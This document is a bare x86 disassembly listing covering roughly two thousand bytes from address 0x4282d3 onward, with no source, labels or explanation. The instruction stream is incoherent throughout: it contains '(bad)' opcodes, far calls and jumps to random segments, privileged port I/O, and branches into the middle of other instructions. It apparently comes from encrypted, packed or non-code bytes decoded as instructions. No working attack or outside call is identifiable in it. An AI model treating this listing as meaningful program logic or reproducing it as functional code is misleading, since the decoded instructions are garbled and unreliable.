  4282d3:	leave  
  4282d4:	mov    ch,0x7c
  4282d6:	mov    bl,bl
  4282d8:	adc    DWORD PTR [ebx+0x190e5faa],eax
  4282de:	lods   al,BYTE PTR ds:[esi]
  4282df:	test   al,0x89
  4282e1:	scas   al,BYTE PTR es:[edi]
  4282e2:	xchg   ecx,eax
  4282e3:	jmp    0x4282e5
  4282e5:	or     edi,DWORD PTR [ebp-0x2c]
  4282e8:	cmp    eax,0xb250ba85
  4282ed:	loop   0x4282f9
  4282ef:	mov    edi,0xab38dd7f
  4282f4:	imul   ebx,DWORD PTR [esp+edi*1],0x75
  4282f8:	sub    eax,0x8f25dd0b
  4282fd:	push   ecx
  4282fe:	imul   ebp,DWORD PTR [eax+0x21eb19ac],0x6bfb9ff2
  428308:	mov    ecx,0x1a7c67d
  42830d:	xor    al,dh
  42830f:	and    ah,BYTE PTR [ebx]
  428311:	and    ah,BYTE PTR [di-0x6c]
  428315:	jmp    0x4282ee
  428317:	call   0x6b22:0xcaffbeb5
  42831e:	rol    BYTE PTR [ebp+edx*8+0xb],0x15
  428323:	adc    DWORD PTR [ebp+0x6a],esi
  428326:	pop    es
  428327:	fmul   st(0),st
  428329:	sub    al,0x99
  42832b:	mov    ebp,0x10a6b86e
  428330:	pop    es
  428331:	jmp    0x4282f7
  428333:	fs adc esp,ebp
  428336:	mov    dl,0xa4
  428338:	bound  esp,QWORD PTR [eax]
  42833a:	adc    dl,BYTE PTR [edi-0x4c]
  42833d:	and    DWORD PTR [edx],esp
  42833f:	rcr    BYTE PTR [ebx-0x2cf4657a],cl
  428345:	arpl   WORD PTR [ecx+0x7],ax
  428348:	dec    eax
  428349:	stc    
  42834a:	fldenv [esi+0x7467b78a]
  428350:	add    bh,ch
  428352:	mov    esp,0x98ce7428
  428357:	out    0x95,eax
  428359:	clc    
  42835a:	sbb    BYTE PTR [edx],dh
  42835c:	fst    QWORD PTR ds:0x4b1a3407
  428362:	push   esi
  428363:	mov    DWORD PTR [esi+0x4c],ebp
  428366:	sbb    ecx,DWORD PTR [ebx+esi*4]
  428369:	psrad  mm5,QWORD PTR [ecx-0x7c]
  42836d:	stc    
  42836e:	push   ecx
  42836f:	loop   0x4283bf
  428371:	push   eax
  428372:	dec    esp
  428373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428374:	push   edi
  428375:	imul   ebp,DWORD PTR [edi],0xa430c686
  42837b:	mov    ebx,0x302c78b2
  428380:	inc    ebx
  428381:	call   0xf7df0aa8
  428386:	mov    esp,DWORD PTR [edi-0x7da3ad28]
  42838c:	sub    BYTE PTR [ebx-0x34da17f],0xb5
  428393:	(bad)  
  428394:	in     al,0x2
  428396:	out    dx,al
  428397:	mov    es,WORD PTR ds:0xc5ecbb0b
  42839d:	pushf  
  42839e:	(bad)  
  42839f:	js     0x4283ed
  4283a1:	sbb    BYTE PTR [edx-0x706701c3],bl
  4283a7:	add    eax,0xb1e53981
  4283ac:	sub    al,BYTE PTR [ebp+ecx*2-0x57]
  4283b0:	pop    ecx
  4283b1:	popa   
  4283b2:	fidivr DWORD PTR [eax+0x5a8af7d1]
  4283b8:	mov    dl,0xf2
  4283ba:	jmp    0x59e9b92a
  4283bf:	xor    DWORD PTR [ebx+ecx*1-0x3fd406a5],ebp
  4283c6:	dec    eax
  4283c7:	sbb    al,0xb4
  4283c9:	mov    DWORD PTR [ebp-0x2a1992d9],ebx
  4283cf:	jp     0x428446
  4283d1:	cmp    edx,ebx
  4283d3:	int    0xf4
  4283d5:	xor    cl,BYTE PTR [ebx+0x6f8c17a7]
  4283db:	iret   
  4283dc:	jbe    0x42842c
  4283de:	and    al,0xa6
  4283e0:	push   esp
  4283e1:	push   esi
  4283e2:	call   0x9cea:0x2ce0a2b4
  4283e9:	adc    BYTE PTR [ebx-0x4c],0xf9
  4283ed:	inc    edx
  4283ee:	icebp  
  4283ef:	addr16 cmp al,0xfc
  4283f2:	aam    0x9f
  4283f4:	mov    dl,0x8f
  4283f6:	inc    BYTE PTR [edi+0xccea9bf]
  4283fc:	jp     0x428402
  4283fe:	test   al,0x4
  428400:	popf   
  428401:	sbb    ah,BYTE PTR ss:[ebp+0x7c08bed9]
  428408:	mov    dl,0xda
  42840a:	pop    ebp
  42840b:	jmp    0x428439
  42840d:	das    
  42840e:	stos   DWORD PTR es:[edi],eax
  42840f:	xor    BYTE PTR [ebx],ah
  428411:	or     dl,BYTE PTR [ebx-0x1479937c]
  428417:	mov    edi,cs
  428419:	test   DWORD PTR [edx],0x244dea4a
  42841f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428420:	mov    ebp,DWORD PTR [edi]
  428422:	mov    eax,ds:0xbb000730
  428427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428428:	xor    ebx,DWORD PTR [edi]
  42842a:	dec    edx
  42842b:	rol    DWORD PTR [edx],1
  42842d:	mov    ebp,0xebcc35af
  428432:	call   0x9cf3:0x75c98f44
  428439:	cwde   
  42843a:	fisubr DWORD PTR [esi-0x69174a0a]
  428440:	mov    dl,0xec
  428442:	mov    bh,0xf5
  428444:	add    esp,DWORD PTR [esi-0x39494f66]
  42844a:	or     esi,0x38
  42844d:	arpl   WORD PTR [edx+0x2f6670a8],cx
  428453:	add    bl,dl
  428455:	icebp  
  428456:	fwait
  428457:	in     al,dx
  428458:	adc    ebx,ebp
  42845a:	rcl    BYTE PTR [ecx+0x697c5448],1
  428460:	mov    bl,0x56
  428462:	dec    edx
  428463:	dec    ebp
  428464:	xor    al,0x9a
  428466:	sub    BYTE PTR [edx+eax*8+0x78a00a8a],al
  42846d:	popa   
  42846e:	test   eax,0x711bc82d
  428473:	lahf   
  428474:	pop    edx
  428475:	imul   ebx,DWORD PTR [edx+0x2f4d662a],0xdda38591
  42847f:	jmp    0x42842a
  428481:	and    DWORD PTR [ebp-0x48ab7147],ebx
  428487:	out    0x7a,eax
  428489:	sub    DWORD PTR [ecx-0x2a],ebp
  42848c:	mov    dl,0xe1
  42848e:	ja     0x42843b
  428490:	push   edi
  428491:	xor    al,0xd0
  428493:	adc    al,0x73
  428495:	or     ebp,ecx
  428497:	test   DWORD PTR [ecx],0x7895cd37
  42849d:	add    BYTE PTR [edx-0x2825b9f2],bl
  4284a3:	dec    esi
  4284a4:	(bad)  
  4284a5:	and    DWORD PTR [esi-0x59],edx
  4284a8:	scas   al,BYTE PTR es:[edi]
  4284a9:	or     BYTE PTR [ecx],cl
  4284ab:	inc    eax
  4284ac:	jnp    0x4284a3
  4284ae:	pop    esp
  4284af:	rcr    DWORD PTR [edx+0x37],1
  4284b2:	mov    bh,0xd0
  4284b4:	inc    edx
  4284b5:	push   ebp
  4284b6:	dec    esi
  4284b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284b8:	div    BYTE PTR [ecx+ebx*1+0x32]
  4284bc:	cwde   
  4284bd:	sti    
  4284be:	mov    cs,WORD PTR [edi-0x2]
  4284c1:	add    edx,edi
  4284c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284c4:	xchg   DWORD PTR [ebp-0x31],ebp
  4284c7:	jno    0x428468
  4284c9:	and    esp,DWORD PTR [edi+ecx*4]
  4284cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4284cd:	test   eax,0x1726a77b
  4284d2:	jp     0x4284b9
  4284d4:	bound  edx,QWORD PTR [ecx+0x5bb2e1a7]
  4284da:	(bad)  
  4284db:	jmp    0x1bed448c
  4284e0:	in     eax,0x35
  4284e2:	push   ebx
  4284e3:	cli    
  4284e4:	rcl    BYTE PTR [edi+0x4c],cl
  4284e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284e8:	xchg   esi,eax
  4284e9:	loopne 0x428485
  4284eb:	push   cs
  4284ec:	mov    eax,0x4d2b523d
  4284f1:	jns    0x42852a
  4284f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4284f4:	stc    
  4284f5:	mov    dh,0x3f
  4284f7:	pop    esp
  4284f8:	and    BYTE PTR [ebx-0x53d0b422],bl
  4284fe:	jle    0x428482
  428500:	mov    dl,0x6
  428502:	jl     0x4284c6
  428504:	pusha  
  428505:	aas    
  428506:	sbb    cl,al
  428508:	aad    0x16
  42850a:	inc    ebp
  42850b:	into   
  42850c:	lods   eax,DWORD PTR ds:[esi]
  42850d:	dec    ebx
  42850e:	pop    ecx
  42850f:	push   eax
  428510:	and    DWORD PTR [edi],ecx
  428512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428513:	push   ecx
  428514:	(bad)  
  428515:	sahf   
  428516:	cdq    
  428517:	xchg   BYTE PTR [eax],dl
  428519:	or     al,0x63
  42851b:	in     eax,0x87
  42851d:	repnz xchg edx,eax
  42851f:	mov    BYTE PTR [edi+0x3d],al
  428522:	jp     0x428586
  428524:	test   eax,0xc6f2270b
  428529:	pop    ebx
  42852a:	cli    
  42852b:	mov    bh,0xc2
  42852d:	mov    eax,0xca63d98
  428532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428533:	cli    
  428534:	jge    0x428501
  428536:	je     0x42854d
  428538:	mov    edi,0xaa67c47a
  42853d:	sbb    BYTE PTR [ebx-0x62f3ed0b],al
  428543:	jge    0x4285a3
  428545:	jno    0x4284fa
  428547:	mov    al,BYTE PTR ds:0x746bca57
  42854d:	fbld   TBYTE PTR [eax-0x59]
  428550:	test   eax,0x6b0bbd2e
  428555:	fs jmp 0x428596
  428558:	mov    dl,0xfe
  42855a:	inc    edi
  42855b:	jl     0x428501
  42855d:	ja     0x428520
  42855f:	adc    BYTE PTR [eax+0xa],al
  428562:	into   
  428563:	inc    ebx
  428564:	push   0xffffffdc
  428566:	cld    
  428567:	fbld   TBYTE PTR [ebp-0x3bec8321]
  42856d:	inc    ebx
  42856e:	xchg   ebp,eax
  42856f:	or     al,BYTE PTR [edx+0x45e7b68e]
  428575:	or     al,0x92
  428577:	stc    
  428578:	cmp    DWORD PTR [ebx],ecx
  42857a:	dec    esp
  42857b:	sbb    BYTE PTR [ebp+0x6c],ch
  42857e:	mov    WORD PTR [esi],fs
  428580:	std    
  428581:	and    bl,BYTE PTR [edx+0x706f21c4]
  428587:	test   DWORD PTR [ebx+ebx*2],esp
  42858a:	mov    esi,0x52590e94
  42858f:	inc    esi
  428590:	xor    dl,BYTE PTR [ebx+0x1fb2b725]
  428596:	leave  
  428597:	out    dx,eax
  428598:	push   ss
  428599:	lahf   
  42859a:	or     al,0xff
  42859c:	or     ebx,DWORD PTR gs:[eax+0x15]
  4285a0:	ret    
  4285a1:	xlat   BYTE PTR ds:[ebx]
  4285a2:	and    BYTE PTR [edx],cl
  4285a4:	pop    ss
  4285a5:	test   eax,0x3ce3829a
  4285aa:	out    dx,al
  4285ab:	jge    0x42853d
  4285ad:	adc    DWORD PTR [ebx-0x57],0xf5a082b
  4285b4:	xchg   edx,eax
  4285b5:	dec    edi
  4285b6:	push   esp
  4285b7:	outs   dx,DWORD PTR ds:[esi]
  4285b8:	adc    DWORD PTR [eax-0x625a9c9a],0x75
  4285bf:	pop    ecx
  4285c0:	repnz sbb eax,0x70f82b31
  4285c6:	and    al,0xa4
  4285c8:	ss js  0x42857d
  4285cb:	adc    cl,0xb4
  4285ce:	pop    edx
  4285cf:	and    DWORD PTR [edi+0x2e],ebp
  4285d2:	popf   
  4285d3:	adc    BYTE PTR [ebx+edi*2+0x1b],dl
  4285d7:	(bad)  
  4285d8:	mov    dl,0x5
  4285da:	jp     0x428657
  4285dc:	ins    BYTE PTR es:[edi],dx
  4285dd:	or     BYTE PTR [ebp+0x3c2f86a2],bh
  4285e3:	repnz pop edx
  4285e5:	xchg   cl,dl
  4285e7:	push   esp
  4285e8:	sahf   
  4285e9:	imul   ebx,DWORD PTR [ecx],0xffffff96
  4285ec:	mov    dl,0x7e
  4285ee:	jns    0x4285ff
  4285f0:	mov    DWORD PTR [esi+0x27b9a7f3],edi
  4285f6:	jge    0x428581
  4285f8:	aas    
  4285f9:	in     eax,0xf2
  4285fb:	mov    cl,0x9e
  4285fd:	jg     0x428649
  4285ff:	sub    BYTE PTR [esi-0x7f1442a2],bh
  428605:	or     al,0x4f
  428607:	jo     0x4285eb
  428609:	call   0x2ed32d2b
  42860e:	out    0x7d,al
  428610:	mov    dl,0x24
  428612:	mov    BYTE PTR [esp+edx*8],bh
  428615:	cwde   
  428616:	xchg   edi,eax
  428617:	mov    edx,0x734f0b94
  42861c:	shr    BYTE PTR [edi],cl
  42861e:	aam    0x39
  428620:	call   0x7fec21fe
  428625:	adc    BYTE PTR ds:0xea90133f,cl
  42862b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42862c:	sbb    DWORD PTR [edx+ebx*2],ecx
  42862f:	out    dx,eax
  428630:	(bad)  
  428631:	pop    ss
  428632:	or     BYTE PTR [edi],dh
  428634:	xchg   BYTE PTR [ecx],bh
  428636:	ficomp DWORD PTR [edi-0x4e48d64e]
  42863c:	dec    ebx
  42863d:	imul   esp
  42863f:	loopne 0x428657
  428641:	or     ebx,DWORD PTR [edi]
  428643:	adc    ebp,DWORD PTR [esi+0x6c178ee0]
  428649:	and    al,0x9a
  42864b:	mov    edx,0x6159f33a
  428650:	sahf   
  428651:	xor    eax,0x724da739
  428656:	rcl    bh,0xc9
  428659:	or     eax,0xa9a0b2ce
  42865f:	loopne 0x42869a
  428661:	xchg   edi,eax
  428662:	and    al,0x5b
  428664:	pop    es
  428665:	add    al,0xd0
  428667:	pop    edx
  428668:	or     esp,edi
  42866a:	cmp    ch,BYTE PTR [esi-0x595b2dfd]
  428670:	mov    esi,0xd8b45142
  428675:	sub    ebp,DWORD PTR [edx-0x47819b5d]
  42867b:	or     al,0x5a
  42867d:	mov    eax,DWORD PTR [esi]
  42867f:	retf   
  428680:	jnp    0x4286f4
  428682:	call   0xf300:0x474ec318
  428689:	les    ebx,FWORD PTR [edx-0x26]
  42868c:	inc    esi
  42868d:	xor    eax,0x258ad220
  428692:	sbb    bl,BYTE PTR [eax+eax*4-0x3a9d581a]
  428699:	add    DWORD PTR [edi+0x68870720],ebx
  42869f:	sub    DWORD PTR [edx],esi
  4286a1:	stc    
  4286a2:	xchg   edi,eax
  4286a3:	xlat   BYTE PTR ds:[ebx]
  4286a4:	sub    BYTE PTR [ebx-0x12],dl
  4286a7:	push   esp
  4286a8:	mov    dl,0x49
  4286aa:	(bad)  
  4286ab:	out    0x66,eax
  4286ad:	dec    edx
  4286ae:	push   eax
  4286af:	ret    0x73b2
  4286b2:	sub    ecx,edi
  4286b4:	adc    DWORD PTR [ecx+0x34901353],ebp
  4286ba:	ds and BYTE PTR ss:[eax-0x29],dh
  4286bf:	mov    ebx,0x3d544a68
  4286c4:	enter  0xc7ee,0x47
  4286c8:	add    ch,BYTE PTR [ebp-0x7c]
  4286cb:	stos   BYTE PTR es:[edi],al
  4286cc:	add    bx,WORD PTR [ecx]
  4286cf:	sbb    al,0x2b
  4286d1:	xchg   ch,bl
  4286d3:	dec    edi
  4286d4:	aad    0x17
  4286d6:	adc    DWORD PTR [esi+0xd883054],esp
  4286dc:	and    al,0x66
  4286de:	adc    ebx,DWORD PTR [eax+0x72]
  4286e1:	xchg   ebp,eax
  4286e2:	icebp  
  4286e3:	and    dl,0x48
  4286e6:	inc    ebx
  4286e7:	push   esp
  4286e8:	mov    dl,0x9f
  4286ea:	jle    0x4286da
  4286ec:	inc    edi
  4286ed:	cmp    DWORD PTR [ebx-0x3],eax
  4286f0:	pushf  
  4286f1:	mov    bl,0x1e
  4286f3:	aaa    
  4286f4:	mov    cs,WORD PTR [ebx]
  4286f6:	sub    ah,BYTE PTR [eax-0x363a3a50]
  4286fc:	push   esp
  4286fd:	sti    
  4286fe:	in     eax,0x5c
  428700:	scas   al,BYTE PTR es:[edi]
  428701:	retf   0xaa9f
  428704:	repnz cli 
  428706:	arpl   si,cx
  428708:	test   eax,0x80bbed80
  42870d:	jge    0x428691
  42870f:	pop    ebp
  428710:	mov    dl,0x84
  428712:	inc    ecx
  428713:	cmp    al,0x14
  428715:	les    ebp,FWORD PTR [ebx]
  428717:	sub    eax,0xbbfa5db2
  42871c:	jns    0x42875c
  42871e:	aaa    
  42871f:	fucomp st(2)
  428721:	adc    eax,0xb32f4bdf
  428726:	popf   
  428727:	jmp    0x7748ba3b
  42872c:	sbb    ah,BYTE PTR [ecx+eax*2+0x6]
  428730:	mov    dl,0x67
  428732:	ss jb  0x428708
  428735:	out    0xa3,eax
  428737:	mov    esp,0xf2ed0b3f
  42873c:	in     eax,dx
  42873d:	in     eax,0x5a
  42873f:	ss mov dh,bl
  428742:	push   0x85d3bdd1
  428747:	loopne 0x428702
  428749:	stos   DWORD PTR es:[edi],eax
  42874a:	jmp    0x3076d8e6
  42874f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428750:	icebp  
  428751:	add    DWORD PTR [ecx+ebp*1+0x78],0xb28ceedb
  428759:	aas    
  42875a:	dec    edi
  42875b:	cld    
  42875c:	test   al,0x93
  42875e:	hlt    
  42875f:	adc    eax,0x3a7a0b68
  428764:	ret    0xd944
  428767:	xchg   esp,eax
  428768:	pop    esp
  428769:	test   eax,0x4cf789a
  42876e:	(bad)  
  42876f:	and    dl,al
  428771:	dec    ebx
  428772:	cli    
  428773:	mov    al,ds:0x8e94f70a
  428778:	jecxz  0x428765
  42877a:	arpl   WORD PTR cs:[ecx+edx*2-0x6c],bx
  42877f:	dec    edi
  428780:	mov    eax,ds:0xa5c75c2a
  428785:	leave  
  428786:	inc    esi
  428787:	jbe    0x4287b8
  428789:	or     al,0x48
  42878b:	mov    ?,WORD PTR [edx+0x6]
  42878e:	call   0x17f1e04a
  428793:	adc    eax,0xa58761b2
  428798:	and    ebx,DWORD PTR [edi+0xbeafe51]
  42879e:	jp     0x428760
  4287a0:	leave  
  4287a1:	xchg   ebp,eax
  4287a2:	pop    eax
  4287a3:	call   0xe5dd0aa7
  4287a8:	jl     0x4287c4
  4287aa:	jns    0x4287f7
  4287ac:	jne    0x4287e9
  4287ae:	or     DWORD PTR [edi-0x78a386c9],esp
  4287b4:	shl    BYTE PTR [ecx+0x5db2775f],1
  4287ba:	enter  0x5a5,0x67
  4287be:	pop    esi
  4287bf:	retf   0x5c9
  4287c2:	sub    al,0xff
  4287c4:	shl    dh,0xfa
  4287c7:	and    DWORD PTR [ebp-0x4d0b640e],0x99a37fa2
  4287d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4287d2:	mov    bh,0x29
  4287d4:	pop    es
  4287d5:	or     ebx,ebx
  4287d7:	test   eax,0xe350631a
  4287dc:	out    dx,eax
  4287dd:	fsub   QWORD PTR [esi-0x1174769e]
  4287e3:	or     eax,0x7f69b044
  4287e8:	pop    ebp
  4287e9:	or     edx,esp
  4287eb:	addr16 (bad) 
  4287ee:	push   ds
  4287ef:	(bad)
  4287f2:	xchg   ebp,eax
  4287f3:	mov    al,0x66
  4287f5:	push   es
  4287f6:	shl    BYTE PTR [edi],1
  4287f8:	loop   0x428830
  4287fa:	jmp    0xc24ddbf7
  4287ff:	dec    edx
  428800:	push   es
  428801:	sbb    ecx,esi
  428803:	pusha  
  428804:	mov    bh,0x2a
  428806:	call   0x4729:0x1af0e3c8
  42880d:	inc    esp
  42880e:	xchg   DWORD PTR [edx-0x588571a0],edi
  428814:	jg     0x4287ab
  428816:	pusha  
  428817:	mov    esi,0xee9505a1
  42881c:	scas   al,BYTE PTR es:[edi]
  42881d:	push   0xffffffcb
  42881f:	mov    cs,WORD PTR [ebx+ecx*1+0x74]
  428823:	sub    cl,dl
  428825:	xor    BYTE PTR [edi+eiz*4-0x741cde5b],cl
  42882c:	pop    eax
  42882d:	sbb    BYTE PTR ds:0x9a905291,bh
  428833:	int    0xf9
  428835:	adc    BYTE PTR [ecx+ecx*2+0x67],dl
  428839:	imul   ebp,DWORD PTR [ebp+0x2983d5a7],0xb89ae247
  428843:	lods   eax,DWORD PTR ds:[esi]
  428844:	mov    ebp,DWORD PTR [ecx+eiz*1]
  428847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428848:	call   0x73e3:0xe13c6d2d
  42884f:	mov    al,0xe8
  428851:	or     ecx,esi
  428853:	pop    esi
  428854:	pusha  
  428855:	mov    ebp,0x9f9d23fc
  42885a:	call   0xb934:0x7110c04d
  428861:	add    eax,0x7b9aa74c
  428866:	stc    
  428867:	nop    DWORD PTR [esi-0x2a]
  42886b:	and    al,0xb1
  42886d:	test   BYTE PTR [ecx],0x84
  428870:	jbe    0x428834
  428872:	or     eax,0x91439227
  428877:	cwde   
  428878:	cmp    al,BYTE PTR [eax+0xb402ba4]
  42887e:	mov    WORD PTR [esi+0x7da1b8f],?
  428884:	sub    ebx,DWORD PTR [edx-0x66]
  428887:	in     eax,dx
  428888:	pushf  
  428889:	sub    DWORD PTR [esi-0x213972cb],edx
  42888f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428890:	sti    
  428891:	lock retf 0xbcd3
  428895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428896:	(bad)  
  428897:	and    eax,0xb1c2ddb5
  42889c:	aad    0x8f
  42889e:	push   ebx
  42889f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4288a0:	mov    esi,0x92a4a126
  4288a5:	outs   dx,BYTE PTR ds:[esi]
  4288a6:	xor    esp,DWORD PTR [esi-0x1ed38d7f]
  4288ac:	ror    BYTE PTR [edi],1
  4288ae:	jo     0x4288fa
  4288b0:	xchg   esi,eax
  4288b1:	shl    DWORD PTR [ebp+0x669ab284],cl
  4288b7:	mov    ecx,0x42b45ea4
  4288bc:	and    DWORD PTR [ebx],ecx
  4288be:	mov    ds:0x760e4505,al
  4288c3:	xchg   esp,eax
  4288c4:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4288c6:	call   0xcd1:0x3d1799ac
  4288cd:	and    eax,0xb374b2a
  4288d2:	and    BYTE PTR [esi*4+0x175d8f7e],cl
  4288d9:	dec    edx
  4288da:	mov    ds:0x3e0bee2b,eax
  4288df:	mov    ch,0x91
  4288e1:	inc    esp
  4288e2:	je     0x4288d7
  4288e4:	jne    0x4288f0
  4288e6:	xor    ecx,ebx
  4288e8:	imul   ebp,DWORD PTR [ecx-0x28390f84],0x4cb2a17e
  4288f2:	push   edx
  4288f3:	scas   eax,DWORD PTR es:[edi]
  4288f4:	jmp    0xb8caf9c2
  4288f9:	sub    eax,0xbfa206c
  4288fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4288ff:	push   0x866b10a3
  428904:	mov    dl,0xeb
  428906:	arpl   WORD PTR [ecx],di
  428908:	dec    edi
  428909:	mov    eax,ds:0x6b741a87
  42890e:	stos   BYTE PTR es:[edi],al
  42890f:	xor    DWORD PTR [eax],esi
  428911:	es push es
  428913:	bound  ebp,QWORD PTR [edi+0x32f34a32]
  428919:	and    al,0xd1
  42891b:	cmp    eax,0xa7fe4317
  428920:	and    BYTE PTR [ebx+0x25d09196],0xf6
  428927:	mov    ebp,0xd9186abc
  42892c:	loopne 0x4288f9
  42892e:	dec    ecx
  42892f:	adc    eax,0xa79d1b4f
  428934:	fcomp  QWORD PTR [edi]
  428936:	outs   dx,DWORD PTR ds:[esi]
  428937:	loopne 0x4288e3
  428939:	imul   ecx,DWORD PTR [ecx+0x6a8bb2ac],0x232b22b9
  428943:	xlat   BYTE PTR ds:[ebx]
  428944:	jne    0x428951
  428946:	xchg   BYTE PTR [esi],cl
  428948:	pop    ds
  428949:	clc    
  42894a:	cmp    edi,DWORD PTR ds:0xc1a19c14
  428950:	or     BYTE PTR [ebx],cl
  428952:	or     BYTE PTR [ebp+0x695fe20d],bh
  428958:	push   0xffffffb3
  42895a:	pop    edx
  42895b:	mov    ebx,0x67bb3a12
  428960:	mov    dh,0x87
  428962:	mov    BYTE PTR [edx],bh
  428964:	int    0xbf
  428966:	call   0x2c4:0x8ccf9553
  42896d:	mov    al,0x17
  42896f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428970:	inc    edi
  428971:	adc    al,0xcb
  428973:	aas    
  428974:	idiv   DWORD PTR [esi-0x714d17ee]
  42897a:	mov    ah,0x19
  42897c:	test   BYTE PTR [edi+0xc7807a3],dl
  428982:	test   al,0x2
  428984:	fiadd  WORD PTR [ecx]
  428986:	jl     0x42895e
  428988:	int3   
  428989:	xchg   ecx,eax
  42898a:	mov    cl,0x97
  42898c:	mov    ds:0xb1d12ad5,al
  428991:	xchg   DWORD PTR [eax+0x55],edi
  428994:	cmp    DWORD PTR [ebx-0x3d],ebp
  428997:	and    al,0xf1
  428999:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42899a:	jge    0x428a1a
  42899c:	add    ebx,ecx
  42899e:	repnz mov ebp,0x99af354a
  4289a4:	pop    ecx
  4289a5:	ret    0xbb0e
  4289a8:	sbb    DWORD PTR [ebp+0x4710ce9a],0x50789d79
  4289b2:	call   0xed24:0x62f92dc7
  4289b9:	aaa    
  4289ba:	aam    0xdc
  4289bc:	sub    ecx,DWORD PTR [ebx]
  4289be:	das    
  4289bf:	test   ebp,eax
  4289c1:	mov    esp,0xdee2aef4
  4289c6:	rol    BYTE PTR [eax+0x68430b24],cl
  4289cc:	adc    al,0x3d
  4289ce:	sbb    eax,0x3908f7cd
  4289d3:	fldcw  WORD PTR [edx+0x22a39249]
  4289d9:	jae    0x428a38
  4289db:	mov    BYTE PTR [edx+ebx*8+0x36b2ede9],ch
  4289e2:	inc    esi
  4289e3:	test   BYTE PTR [esi+edx*8-0x6c005bb3],0x95
  4289eb:	pop    edi
  4289ec:	jbe    0x4289d0
  4289ee:	add    dh,BYTE PTR [edi-0x4065fef0]
  4289f4:	add    esi,DWORD PTR [ecx+0x26c7aea5]
  4289fa:	(bad)  [edi-0x253f69cc]
  428a00:	push   ebp
  428a01:	xchg   edi,eax
  428a02:	mov    edx,0xa8adaceb
  428a07:	jp     0x428a7b
  428a09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428a0a:	loop   0x428a40
  428a0c:	jmp    0xb69a7f3d
  428a11:	or     al,0xb9
  428a13:	icebp  
  428a14:	test   eax,esi
  428a16:	pushf  
  428a17:	ret    
  428a18:	int3   
  428a19:	retf   
  428a1a:	xor    BYTE PTR [edi-0xf],cl
  428a1d:	cs call 0xbc12:0x4e9fd307
  428a25:	lea    esp,[eax]
  428a27:	mov    ecx,0x205b43c2
  428a2c:	cdq    
  428a2d:	fwait
  428a2e:	pop    ebp
  428a2f:	push   edi
  428a30:	pop    edi
  428a31:	cld    
  428a32:	jp     0x4289b6
  428a34:	mov    dl,0xd0
  428a36:	cli    
  428a37:	hlt    
  428a38:	mov    ebp,0xb4834ebc
  428a3d:	or     edi,DWORD PTR [eax]
  428a3f:	repz aaa 
  428a41:	repnz lea edi,[edx-0x63]
  428a45:	inc    esi
  428a46:	cwde   
  428a47:	int    0x1b
  428a49:	lahf   
  428a4a:	loope  0x428a58
  428a4c:	lods   eax,DWORD PTR ds:[esi]
  428a4d:	retf   
  428a4e:	pop    esp
  428a4f:	xchg   ebp,eax
  428a50:	or     BYTE PTR [ebx],cl
  428a52:	ror    BYTE PTR [eax],0x84
  428a55:	push   ss
  428a56:	les    edx,FWORD PTR [edi+0x36]
  428a59:	adc    ebx,DWORD PTR [edx-0x7a526c2c]
  428a5f:	push   ss
  428a60:	or     ch,ah
  428a62:	retf   0x5ba7
  428a65:	aam    0x8f
  428a67:	inc    edi
  428a68:	aam    0xc3
  428a6a:	iret   
  428a6b:	out    dx,al
  428a6c:	int3   
  428a6d:	out    dx,al
  428a6e:	call   0x1b15:0x9a90c30
  428a75:	clc    
  428a76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428a78:	push   ebp
  428a79:	aam    0xd7
  428a7b:	or     dh,BYTE PTR [eiz*4-0x284d4360]
  428a82:	ins    DWORD PTR es:[edi],dx
  428a83:	xchg   esi,eax
  428a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428a85:	(bad)  
  428a86:	aam    0xb8
  428a88:	or     BYTE PTR [ebx],cl
  428a8a:	mov    bl,0xb
  428a8c:	xchg   edi,eax
  428a8d:	push   edi
  428a8e:	jle    0x428af0
  428a90:	ja     0x428aff
  428a92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428a93:	daa    
  428a94:	or     cx,WORD PTR [ebx+0x58a32b08]
  428a9b:	mov    bl,0x3
  428a9d:	or     ecx,DWORD PTR [edx*4-0x3baa3241]
  428aa4:	push   es
  428aa5:	fstp   QWORD PTR [edx+0x3ceff517]
  428aab:	cmp    esp,DWORD PTR [ebp+0x3]
  428aae:	(bad)  
  428aaf:	fcomp  QWORD PTR [edi]
  428ab1:	or     edx,DWORD PTR [edi-0x6cd44294]
  428ab7:	pop    esp
  428ab8:	pop    esp
  428ab9:	not    BYTE PTR [ebp-0x5c3e0b6d]
  428abf:	leave  
  428ac0:	out    0xab,eax
  428ac2:	add    ah,BYTE PTR [edx+0x6e]
  428ac5:	inc    ebp
  428ac6:	in     eax,0xbb
  428ac8:	jmp    0x5529f009
  428acd:	jmp    0x428abf
  428acf:	mov    ds:0xea9a8b44,al
  428ad4:	xor    BYTE PTR [eax-0x27],ch
  428ad7:	mov    al,0x73
  428ad9:	fcom   QWORD PTR [ecx]
  428adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428adc:	(bad)  
  428add:	in     al,0x4
  428adf:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
